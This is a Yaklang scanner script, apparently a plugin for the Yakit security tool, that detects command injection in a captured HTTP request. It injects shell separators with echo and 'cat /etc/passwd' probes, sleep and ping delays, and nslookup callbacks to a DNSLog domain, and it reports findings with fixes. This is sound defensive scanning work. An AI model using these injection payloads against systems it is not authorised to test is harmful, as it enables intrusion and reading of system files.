__DESC__ = "检测命令注入漏洞，支持回显检测、时间盲注、DNSLog 带外检测，优先本地检测，适合内网环境"
__VERBOSE_NAME__ = "命令注入检测"
__KEYWORDS__ = "command-injection,rce,os-command,shell-injection,code-execution"

// 配置项
debug = false
threads = 5  // 命令注入检测较慢，不宜过高并发

// -------------------------------------------------------------------
// CLI 参数定义
// -------------------------------------------------------------------
flowIDStr = cli.String(
    "httpflow-id",
    cli.setVerboseName("HTTPFlowID"),
    cli.setHelp("History 中的 HTTPFlow ID,用于获取请求/响应包内容"),
    cli.setRequired(true),
)
cli.check()

// 辅助输出函数
aiOut = msg => {
    try {
        yakit.AIOutput(msg)
    } catch {
        println(msg)
    }
}

// -------------------------------------------------------------------
// 核心数据结构
// -------------------------------------------------------------------

// 命令注入上下文（注入点类型）
injectionContexts = [
    {"type": "direct", "prefix": "", "suffix": ""},
    {"type": "semicolon", "prefix": "; ", "suffix": ""},
    {"type": "and", "prefix": " && ", "suffix": ""},
    {"type": "pipe", "prefix": " | ", "suffix": ""},
    {"type": "or", "prefix": " || ", "suffix": ""},
    {"type": "backtick", "prefix": "`", "suffix": "`"},
    {"type": "dollar", "prefix": "$(", "suffix": ")"},
    {"type": "newline", "prefix": "\n", "suffix": ""},
]

// 回显检测命令
echoCommands = [
    // 通用 - 使用 echo 命令
    {
        "cmd": "echo CMDINJTEST",
        "os": "universal",
        "pattern": `CMDINJTEST`,
        "description": "Echo 回显测试"
    },

    // Linux 命令
    {
        "cmd": "whoami",
        "os": "linux",
        "pattern": `^[a-z_][a-z0-9_-]{0,31}$`,
        "description": "获取当前用户名"
    },
    {
        "cmd": "id",
        "os": "linux",
        "pattern": `uid=\d+\([a-z_][a-z0-9_-]*\)`,
        "description": "获取用户 ID 信息"
    },
    {
        "cmd": "cat /etc/passwd",
        "os": "linux",
        "pattern": `root:.*:0:0:`,
        "description": "读取 /etc/passwd"
    },

    // Windows 命令
    {
        "cmd": "whoami",
        "os": "windows",
        "pattern": `(?i)[a-z0-9\-]+\\[a-z0-9_\-]+`,
        "description": "获取当前用户名 (Windows)"
    },
    {
        "cmd": "type C:\\Windows\\win.ini",
        "os": "windows",
        "pattern": `\[fonts\]|\[extensions\]`,
        "description": "读取 win.ini"
    },
]

// 时间盲注命令
timeBasedCommands = [
    // Linux
    {"cmd": "sleep 5", "os": "linux", "delay": 5},
    {"cmd": "ping -c 5 127.0.0.1", "os": "linux", "delay": 5},

    // Windows
    {"cmd": "timeout /t 5", "os": "windows", "delay": 5},
    {"cmd": "ping -n 5 127.0.0.1", "os": "windows", "delay": 5},
]

// -------------------------------------------------------------------
// 辅助函数
// -------------------------------------------------------------------

// 构造 Payload
buildPayload = func(context, command) {
    return sprintf("%s%s%s", context.prefix, command, context.suffix)
}

// 检查响应是否匹配模式
checkPattern = func(response, pattern) {
    if pattern == "" {
        return false
    }
    return re.Match(response, pattern)
}

// -------------------------------------------------------------------
// 检测函数
// -------------------------------------------------------------------

// 阶段 1: 回显检测
detectEcho = func(url, param, reqBytes, isHttps) {
    aiOut("  [1/3] 回显检测...")

    freq, err = fuzz.HTTPRequest(reqBytes, fuzz.https(isHttps))
    if err != nil {
        return false
    }

    for _, cmdInfo = range echoCommands {
        for _, context = range injectionContexts {
            payload = buildPayload(context, cmdInfo.cmd)

            // 发送测试请求
            results, err = param.Fuzz(payload).ExecFirst()

            if err != nil {
                continue
            }

            respBody = string(results.ResponseRaw)

            // 检查是否匹配特征
            if checkPattern(respBody, cmdInfo.pattern) {
                aiOut(sprintf("  ✓ 发现命令注入 (回显): %s", cmdInfo.description))
                reportCommandInjection(url, param, payload, results.RequestRaw, results.ResponseRaw, "echo", cmdInfo.os)
                return true
            }
        }
    }

    return false
}

// 阶段 2: 时间盲注检测
detectTimeBased = func(url, param, reqBytes, isHttps) {
    aiOut("  [2/3] 时间盲注检测...")

    threshold = 4.0  // 判断阈值（秒）

    freq, err = fuzz.HTTPRequest(reqBytes, fuzz.https(isHttps))
    if err != nil {
        return false
    }

    // 测试基线时间（正常请求）
    baselineStart = time.Now()
    freq.ExecFirst()
    baselineTime = time.Since(baselineStart).Seconds()

    aiOut(sprintf("    → 基线响应时间: %.2f 秒", baselineTime))

    for _, cmdInfo = range timeBasedCommands {
        for _, context = range injectionContexts {
            payload = buildPayload(context, cmdInfo.cmd)

            // 测试注入后的时间
            injectionStart = time.Now()
            results, err = param.Fuzz(payload).ExecFirst()
            injectionTime = time.Since(injectionStart).Seconds()

            if err != nil {
                continue
            }

            // 判断时间差异
            timeDiff = injectionTime - baselineTime

            aiOut(sprintf("    → 测试 %s: %.2f 秒 (差异: %.2f 秒)", cmdInfo.os, injectionTime, timeDiff))

            if timeDiff >= threshold {
                aiOut(sprintf("  ✓ 发现命令注入 (时间盲注): %s (延时: %.2f秒)", cmdInfo.cmd, timeDiff))
                reportCommandInjection(url, param, payload, results.RequestRaw, results.ResponseRaw, "time-based", cmdInfo.os)
                return true
            }
        }
    }

    return false
}

// 阶段 3: DNSLog 带外检测
detectDNSLog = func(url, param, reqBytes, isHttps) {
    aiOut("  [3/3] DNSLog 带外检测...")

    // 获取 DNSLog 域名
    dnslogDomain, dnslogToken, err = risk.NewDNSLogDomain()
    if err != nil {
        aiOut(sprintf("  × DNSLog 获取失败: %v", err))
        return false
    }

    aiOut(sprintf("    → DNSLog 域名: %s", dnslogDomain))

    freq, err = fuzz.HTTPRequest(reqBytes, fuzz.https(isHttps))
    if err != nil {
        return false
    }

    // DNSLog 命令
    dnslogCommands = [
        // Linux
        {"cmd": sprintf("ping -c 1 %s", dnslogDomain), "os": "linux"},
        {"cmd": sprintf("nslookup %s", dnslogDomain), "os": "linux"},

        // Windows
        {"cmd": sprintf("ping -n 1 %s", dnslogDomain), "os": "windows"},
        {"cmd": sprintf("nslookup %s", dnslogDomain), "os": "windows"},
    ]

    for _, cmdInfo = range dnslogCommands {
        for _, context = range injectionContexts {
            payload = buildPayload(context, cmdInfo.cmd)

            // 发送请求
            results, err = param.Fuzz(payload).ExecFirst()

            if err != nil {
                continue
            }

            // 等待 DNS 记录
            sleep(3)

            // 检查 DNSLog 记录
            records, _ = risk.CheckDNSLogByToken(dnslogToken)
            if len(records) > 0 {
                aiOut(sprintf("  ✓ 发现命令注入 (DNSLog): %s", cmdInfo.cmd))
                reportCommandInjection(url, param, payload, results.RequestRaw, results.ResponseRaw, "dnslog", cmdInfo.os)
                return true
            }
        }
    }

    return false
}

// -------------------------------------------------------------------
// 风险上报
// -------------------------------------------------------------------

reportCommandInjection = func(url, param, payload, requestRaw, responseRaw, detectType, os) {
    severity = "critical"

    detectMethod = {
        "echo": "命令回显检测",
        "time-based": "时间盲注检测",
        "dnslog": "DNSLog 带外检测"
    }[detectType]

    risk.NewRisk(
        url,
        risk.title(sprintf("Command Injection: %s", url)),
        risk.titleVerbose(sprintf("命令注入漏洞: %s", url)),
        risk.details({
            "param": param.Name(),
            "payload": payload,
            "detect_method": detectMethod,
            "os": os
        }),
        risk.type("rce-command"),
        risk.severity(severity),
        risk.payload(payload),
        risk.request(requestRaw),
        risk.response(responseRaw),
        risk.description(sprintf("通过参数 '%s' 发现命令注入漏洞。检测方式: %s, 操作系统: %s", param.Name(), detectMethod, os)),
        risk.solution("1. 禁止直接将用户输入拼接到系统命令中。\n2. 使用参数化 API 代替 shell 命令。\n3. 严格过滤特殊字符: | & ; $ ` \n < > ( ) { }\n4. 使用白名单验证用户输入。\n5. 最小化应用程序权限。")
    )
}

// -------------------------------------------------------------------
// 主检测流程
// -------------------------------------------------------------------

testCommandInjection = func(url, param, reqBytes, isHttps) {
    aiOut(sprintf("\n正在检测参数: %s", param.Name()))

    // 阶段 1: 回显检测
    if detectEcho(url, param, reqBytes, isHttps) {
        return true
    }

    // 阶段 2: 时间盲注
    if detectTimeBased(url, param, reqBytes, isHttps) {
        return true
    }

    // 阶段 3: DNSLog
    if detectDNSLog(url, param, reqBytes, isHttps) {
        return true
    }

    aiOut("  → 未发现命令注入漏洞")
    return false
}

// -------------------------------------------------------------------
// 主程序入口
// -------------------------------------------------------------------

flowID = parseInt(flowIDStr)
flowsChan = db.QueryHTTPFlowsByID(flowID)
flow = nil
for f = range flowsChan {
    flow = f
    break
}

if flow == nil {
    aiOut(sprintf("× 未找到 HTTPFlow ID: %v", flowID))
    return
}

reqBytes = flow.GetRequest()
if reqBytes == nil || len(reqBytes) == 0 {
    aiOut("× 请求包为空，无法检测")
    return
}

isHttps = flow.IsHTTPS
url = flow.Url

aiOut(sprintf("=== 开始命令注入检测 (Target: %s) ===\n", url))

// 解析请求参数
freq, err = fuzz.HTTPRequest(reqBytes, fuzz.https(isHttps))
if err != nil {
    aiOut(sprintf("× 解析请求失败: %v", err))
    return
}

allParams = freq.GetCommonParams()

// 过滤无关参数
validParams = []
ignoredParams = ["PHPSESSID", "JSESSIONID", "_ga", "_gid", "submit", "Submit", "csrf", "token"]

for param in allParams {
    ignore = false
    for _, ignoreName = range ignoredParams {
        if str.MatchAllOfRegexp(param.Name(), sprintf("(?i)%s", ignoreName)) {
            ignore = true
            break
        }
    }
    if !ignore {
        validParams = append(validParams, param)
    }
}

if len(validParams) == 0 {
    aiOut("× 未发现可测试的参数")
    return
}

aiOut(sprintf("发现 %d 个可测试参数\n", len(validParams)))

// 并发检测
foundVuln = false
for _, param = range validParams {
    if foundVuln {
        break
    }

    if testCommandInjection(url, param, reqBytes, isHttps) {
        foundVuln = true
    }
}

if !foundVuln {
    aiOut("\n× 所有参数均未发现命令注入漏洞")
}

aiOut("\n=== 命令注入检测完成 ===")
